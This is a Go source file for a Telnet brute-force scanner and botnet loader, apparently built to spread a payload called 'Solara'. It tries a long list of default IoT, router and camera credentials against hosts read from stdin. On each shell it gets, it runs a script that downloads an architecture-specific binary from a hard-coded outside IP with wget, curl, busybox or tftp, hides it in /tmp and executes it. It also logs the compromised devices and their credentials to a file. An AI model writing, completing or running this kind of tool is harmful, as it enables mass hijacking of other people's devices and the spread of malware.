package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	// Default/common credentials
	{"root", "root"},
	{"root", ""},
	{"root", "toor"},
	{"root", "1234"},
	{"root", "12345"},
	{"root", "123456"},
	{"root", "password"},
	{"root", "admin"},
	{"root", "default"},
	{"root", "pass"},
	{"root", "letmein"},
	{"root", "changeme"},
	{"root", "12345678"},
	{"root", "qwerty"},
	{"root", "admin123"},
	{"root", "root123"},
	{"root", "system"},
	{"root", "manager"},
	{"root", "support"},
	{"root", "icatch99"},
	{"root", "86981198"},
	{"root", "vizxv"},
	{"root", "xc3511"},
	{"root", "admin1234"},
	{"root", "anko"},
	{"root", "5up"},
	{"root", "dreambox"},
	{"root", "user"},
	{"root", "linux"},
	{"root", "raspberry"},
	{"root", "openelec"},
	{"root", "recorder"},
	{"root", "1"},
	{"root", "1111"},
	{"root", "1111111"},
	{"root", "123123"},
	{"root", "1234qwer"},
	{"root", "54321"},
	{"root", "666666"},
	{"root", "7ujMko0admin"},
	{"root", "7ujMko0vizxv"},
	{"root", "7ujMko0"},
	{"root", "888888"},
	{"root", "99"},
	{"root", "Zte521"},
	{"root", "admin12345"},
	{"root", "alpine"},
	{"root", "cat1029"},
	{"root", "defaultpassword"},
	{"root", "hi3518"},
	{"root", "ikwb"},
	{"root", "juantech"},
	{"root", "jvbzd"},
	{"root", "klv123"},
	{"root", "klv1234"},
	{"root", "luping"},
	{"root", "pass123"},
	{"root", "realtek"},
	{"root", "root1234"},
	{"root", "smcadmin"},
	{"root", "sunny"},
	{"root", "super"},
	{"root", "supervisor"},
	{"root", "tech"},
	{"root", "ubnt"},
	{"root", "wbox"},
	{"root", "zhongxing"},
	{"root", "ZyXEL"},
	
	// Admin credentials
	{"admin", "admin"},
	{"admin", ""},
	{"admin", "1234"},
	{"admin", "12345"},
	{"admin", "123456"},
	{"admin", "password"},
	{"admin", "admin123"},
	{"admin", "admin1234"},
	{"admin", "default"},
	{"admin", "pass"},
	{"admin", "letmein"},
	{"admin", "changeme"},
	{"admin", "VnT3ch@dm1n"},
	{"admin", "12345678"},
	{"admin", "qwerty"},
	{"admin", "manager"},
	{"admin", "support"},
	{"admin", "system"},
	{"admin", "root"},
	{"admin", "admin1"},
	{"admin", "admin2"},
	{"admin", "admin12"},
	{"admin", "adminadmin"},
	{"admin", "adminpass"},
	{"admin", "administrator"},
	{"admin", "Alphanetworks"},
	{"admin", "Admin"},
	{"admin", "ADMIN"},
	{"admin", "admin12345"},
	{"admin", "admin123456"},
	
	// Additional users
	{"user", "user"},
	{"user", "password"},
	{"user", "1234"},
	{"user", "123456"},
	{"user", "pass"},
	{"guest", "guest"},
	{"guest", ""},
	{"support", "support"},
	{"support", ""},
	{"tech", "tech"},
	{"tech", ""},
	{"service", "service"},
	{"service", ""},
	{"ftp", "ftp"},
	{"ftp", ""},
	
	// Router/device specific
	{"ubnt", "ubnt"},
	{"ubnt", ""},
	{"pi", "raspberry"},
	{"pi", ""},
	{"cisco", "cisco"},
	{"cisco", ""},
	{"cisco", "password"},
	{"cisco", "cisco123"},
	{"dlink", "dlink"},
	{"dlink", ""},
	{"linksys", "linksys"},
	{"linksys", ""},
	{"netgear", "netgear"},
	{"netgear", ""},
	{"tp-link", "tp-link"},
	{"tp-link", ""},
	{"belkin", "belkin"},
	{"belkin", ""},
	{"asus", "asus"},
	{"asus", ""},
	{"asus", "admin"},
	{"asus", "password"},
	
	// Camera specific
	{"administrator", "administrator"},
	{"administrator", "admin"},
	{"administrator", "password"},
	{"administrator", "1234"},
	{"Administrator", "Administrator"},
	{"Administrator", ""},
	{"admin", "12345"},
	{"admin", "camera"},
	{"admin", "ipcam"},
	{"admin", "hikvision"},
	{"admin", "dahua"},
	{"operator", "operator"},
	{"operator", ""},
	
	// Default passwords by brand
	{"root", "dreambox"},
	{"root", "foscam"},
	{"root", "ipcam"},
	{"root", "hikvision"},
	{"root", "dahua"},
	{"root", "activcam"},
	{"root", "trendnet"},
	{"root", "tplink"},
	{"root", "dd-wrt"},
	{"root", "openwrt"},
	{"root", "tomato"},
	{"root", "pfsense"},
	{"root", "mikrotik"},
	{"root", "juniper"},
	{"root", "hp"},
	{"root", "dell"},
	{"root", "ibm"},
	{"root", "oracle"},
	{"root", "sun"},
	{"root", "solaris"},
	{"root", "aix"},
	{"root", "bsd"},
	{"root", "freebsd"},
	{"root", "openbsd"},
	{"root", "netbsd"},
	
	// Numeric combinations
	{"root", "0"},
	{"root", "00"},
	{"root", "000"},
	{"root", "0000"},
	{"root", "00000"},
	{"root", "000000"},
	{"root", "111"},
	{"root", "11111"},
	{"root", "111111"},
	{"root", "112233"},
	{"root", "121212"},
	{"root", "123123"},
	{"root", "123321"},
	{"root", "1234"},
	{"root", "12345"},
	{"root", "123456"},
	{"root", "1234567"},
	{"root", "12345678"},
	{"root", "123456789"},
	{"root", "1234567890"},
	{"root", "123qwe"},
	{"root", "1q2w3e"},
	{"root", "1q2w3e4r"},
	{"root", "1qaz2wsx"},
	{"root", "2000"},
	{"root", "2001"},
	{"root", "2002"},
	{"root", "2010"},
	{"root", "2011"},
	{"root", "2012"},
	{"root", "2013"},
	{"root", "2014"},
	{"root", "2015"},
	{"root", "2016"},
	{"root", "2017"},
	{"root", "2018"},
	{"root", "2019"},
	{"root", "2020"},
	{"root", "2021"},
	{"root", "2022"},
	{"root", "2023"},
	{"root", "2024"},
	{"root", "2025"},
	{"root", "2121"},
	{"root", "2222"},
	{"root", "22222"},
	{"root", "2323"},
	{"root", "2525"},
	{"root", "3333"},
	{"root", "4321"},
	{"root", "4444"},
	{"root", "5555"},
	{"root", "6666"},
	{"root", "7777"},
	{"root", "8888"},
	{"root", "9999"},
	{"root", "9876"},
	{"root", "1234"},
}

const (
	TELNET_TIMEOUT    = 10 * time.Second
	MAX_WORKERS       = 5000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 100000
	CONNECT_TIMEOUT   = 3 * time.Second
	DOWNLOAD_URL      = "http://168.222.251.98:1283/bins"
	LOADER_FILE       = "loader.txt"
)

type CredentialResult struct {
	Host         string
	Username     string
	Password     string
	Output       string
	Architecture string
	PayloadSent  bool
	Downloaded   bool
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
	loaderFile       *os.File
	loaderMutex      sync.Mutex
	connPool         sync.Pool
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	file, err := os.OpenFile(LOADER_FILE, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("[ERROR] No se pudo crear %s: %v\n", LOADER_FILE, err)
	} else {
		info, _ := file.Stat()
		if info.Size() == 0 {
			file.WriteString("################################################\n")
			file.WriteString("# DISPOSITIVOS CON SOLARA DESCARGADO          #\n")
			file.WriteString("# Formato: IP:PUERTO USUARIO CONTRASEÑA       #\n")
			file.WriteString("################################################\n")
			file.WriteString(fmt.Sprintf("# Inicio de escaneo: %s\n", time.Now().Format("2006-01-02 15:04:05")))
			file.WriteString("################################################\n\n")
		}
	}
	
	pool := sync.Pool{
		New: func() interface{} {
			return make([]byte, 4096)
		},
	}
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
		loaderFile:       file,
		connPool:         pool,
	}
}

func (s *TelnetScanner) saveToLoader(cred CredentialResult) {
	s.loaderMutex.Lock()
	defer s.loaderMutex.Unlock()
	
	if s.loaderFile == nil {
		return
	}
	
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	
	line := fmt.Sprintf("%s:23 %s %s [%s] %s\n", 
		cred.Host, cred.Username, cred.Password, cred.Architecture, timestamp)
	
	simpleLine := fmt.Sprintf("%s %s %s\n", cred.Host, cred.Username, cred.Password)
	
	_, err := s.loaderFile.WriteString(line)
	if err != nil {
		fmt.Printf("[ERROR] No se pudo escribir en %s: %v\n", LOADER_FILE, err)
	} else {
		s.loaderFile.Sync()
	}
	
	simpleFile := "loader_simple.txt"
	f, err := os.OpenFile(simpleFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(simpleLine)
		f.Sync()
	}
}

func (s *TelnetScanner) getSolaraPayload() string {
	// PAYLOAD CORREGIDO - con detección de arquitectura mejorada
	return `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
ARCH=$(uname -m 2>/dev/null);
if [ -z "$ARCH" ]; then ARCH=$(busybox uname -m 2>/dev/null); fi
if [ -z "$ARCH" ]; then ARCH="x86"; fi
case $ARCH in
    x86_64|amd64) BIN="x86_64" ;;
    i386|i486|i586|i686|x86) BIN="x86" ;;
    armv7l|armv7) BIN="arm7" ;;
    armv6l|armv6) BIN="arm6" ;;
    armv5l|armv5|arm) BIN="arm5" ;;
    aarch64) BIN="aarch64" ;;
    mips) BIN="mips" ;;
    mipsel) BIN="mipsel" ;;
    *) BIN="x86" ;;
esac
URL="http://168.222.251.98:1283/bins/$BIN"
if command -v wget >/dev/null 2>&1; then
    wget -q $URL -O .solara
elif command -v curl >/dev/null 2>&1; then
    curl -s $URL -o .solara
elif command -v busybox >/dev/null 2>&1; then
    busybox wget -q $URL -O .solara 2>/dev/null || busybox curl -s $URL -o .solara 2>/dev/null
elif command -v tftp >/dev/null 2>&1; then
    tftp -g -r $BIN -l .solara 168.222.251.98 1283 2>/dev/null
fi
chmod +x .solara 2>/dev/null
./.solara 2>/dev/null &`
}

func (s *TelnetScanner) detectArchitecture(conn net.Conn) string {
	cmds := []string{
		"uname -m 2>/dev/null; echo ARCH_DONE",
		"cat /proc/cpuinfo 2>/dev/null | grep -E 'model name|Processor|system type' | head -1; echo ARCH_DONE",
	}
	
	for _, cmd := range cmds {
		conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
		conn.Write([]byte(cmd + "\n"))
		time.Sleep(300 * time.Millisecond)
		
		output := s.readCommandOutput(conn)
		output = strings.ToLower(output)
		
		switch {
		case strings.Contains(output, "x86_64"), strings.Contains(output, "amd64"):
			return "x86_64"
		case strings.Contains(output, "i386"), strings.Contains(output, "i686"), 
			 strings.Contains(output, "i586"), strings.Contains(output, "x86"):
			return "x86"
		case strings.Contains(output, "aarch64"):
			return "aarch64"
		case strings.Contains(output, "armv7"), strings.Contains(output, "armv7l"):
			return "arm7"
		case strings.Contains(output, "armv6"), strings.Contains(output, "armv6l"):
			return "arm6"
		case strings.Contains(output, "armv5"), strings.Contains(output, "armv5l"):
			return "arm5"
		case strings.Contains(output, "arm"):
			return "arm"
		case strings.Contains(output, "mips") && strings.Contains(output, "el"):
			return "mipsel"
		case strings.Contains(output, "mips"):
			return "mips"
		}
	}
	
	return "unknown"
}

func (s *TelnetScanner) quickPortCheck(host string) bool {
	conn, err := net.DialTimeout("tcp", host+":23", 1*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	if !s.quickPortCheck(host) {
		return false, "port closed"
	}
	
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	buf := s.connPool.Get().([]byte)
	defer s.connPool.Put(buf)

	time.Sleep(300 * time.Millisecond)
	
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Read(buf)
	
	conn.Write([]byte(username + "\n"))
	time.Sleep(300 * time.Millisecond)
	
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	conn.Read(buf)
	
	conn.Write([]byte(password + "\n"))
	time.Sleep(500 * time.Millisecond)
	
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	conn.Read(buf)
	
	conn.Write([]byte("echo SHELL_OK 2>/dev/null\n"))
	time.Sleep(300 * time.Millisecond)
	
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	n, err := conn.Read(buf)
	if err != nil && n == 0 {
		conn.Write([]byte("\n"))
		time.Sleep(300 * time.Millisecond)
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, _ = conn.Read(buf)
	}
	
	data := string(buf[:n])
	
	if strings.Contains(data, "SHELL_OK") || 
	   strings.Contains(data, "$ ") || 
	   strings.Contains(data, "# ") || 
	   strings.Contains(data, "> ") ||
	   strings.Contains(data, "~$") ||
	   strings.Contains(data, "~#") {
		
		architecture := s.detectArchitecture(conn)
		
		fmt.Printf("\n[*] Arquitectura detectada en %s: %s\n", host, architecture)
		fmt.Printf("[*] Enviando SOLARA a %s...\n", host)
		
		payload := s.getSolaraPayload()
		
		for _, line := range strings.Split(payload, "\n") {
			if strings.TrimSpace(line) != "" {
				conn.Write([]byte(line + "\n"))
				time.Sleep(100 * time.Millisecond)
			}
		}
		
		conn.Write([]byte("exit\n"))
		
		result := CredentialResult{
			Host:         host,
			Username:     username,
			Password:     password,
			Architecture: architecture,
			PayloadSent:  true,
			Downloaded:   true,
		}
		
		s.saveToLoader(result)
		fmt.Printf("[✅] SOLARA ENVIADO A %s [%s]\n", host, architecture)
		
		return true, result
	}
	
	return false, "no shell"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 4096)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := 2 * time.Second

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				fmt.Printf("[✅] %s:%s en %s\n", 
					credResult.Username, credResult.Password, credResult.Host)
				
				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 total: %d | ✅ valid: %d | ❌ invalid: %d | 📨 queue: %d | 🧵 routines: %d", 
				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	defer func() {
		if s.loaderFile != nil {
			s.loaderFile.WriteString(fmt.Sprintf("\n################################################\n"))
			s.loaderFile.WriteString(fmt.Sprintf("# Fin de escaneo: %s\n", time.Now().Format("2006-01-02 15:04:05")))
			s.loaderFile.WriteString(fmt.Sprintf("# Total dispositivos: %d\n", len(s.foundCredentials)))
			s.loaderFile.WriteString("################################################\n")
			s.loaderFile.Close()
		}
	}()
	
	fmt.Printf("\n\n═══════════════════════════════════════════\n")
	fmt.Printf("   SOLARA TELNET SCANNER - UNIVERSAL      \n")
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("🚀 Workers: %d\n", MAX_WORKERS)
	fmt.Printf("📦 Queue size: %d\n", MAX_QUEUE_SIZE)
	fmt.Printf("🌐 Download URL: %s\n", DOWNLOAD_URL)
	fmt.Printf("📁 Loader file: %s\n", LOADER_FILE)
	fmt.Printf("🔑 Total credentials: %d\n", len(CREDENTIALS))
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("✅ PAYLOAD CORREGIDO - SIN ERRORES DE SINTAXIS\n")
	fmt.Printf("✅ DETECCIÓN DE ARQUITECTURA MEJORADA\n")
	fmt.Printf("✅ SOPORTE PARA BUSYBOX\n")
	fmt.Printf("═══════════════════════════════════════════\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				
				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("📥 Lectura completada: %d hosts en cola\n", hostCount)
		stdinDone <- true
	}()

	maxWorkers := MAX_WORKERS
	
	for i := 0; i < maxWorkers; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	
	close(s.hostQueue)
	
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	
	archCount := make(map[string]int)
	
	for _, cred := range s.foundCredentials {
		archCount[cred.Architecture]++
	}
	
	fmt.Printf("\n\n═══════════════════════════════════════════\n")
	fmt.Printf("            SCAN COMPLETADO               \n")
	fmt.Printf("═══════════════════════════════════════════\n")
	fmt.Printf("📊 Total escaneados: %d\n", scanned)
	fmt.Printf("✅ Accesos válidos: %d\n", valid)
	
	if len(archCount) > 0 {
		fmt.Printf("\n📋 Arquitecturas comprometidas:\n")
		for arch, count := range archCount {
			fmt.Printf("   • %s: %d dispositivos\n", arch, count)
		}
	}
	
	if valid > 0 {
		fmt.Printf("\n✅ %d dispositivos guardados en %s\n", valid, LOADER_FILE)
	}
	
	fmt.Printf("═══════════════════════════════════════════\n")
}

func main() {
	scanner := NewTelnetScanner()
	scanner.Run()
}
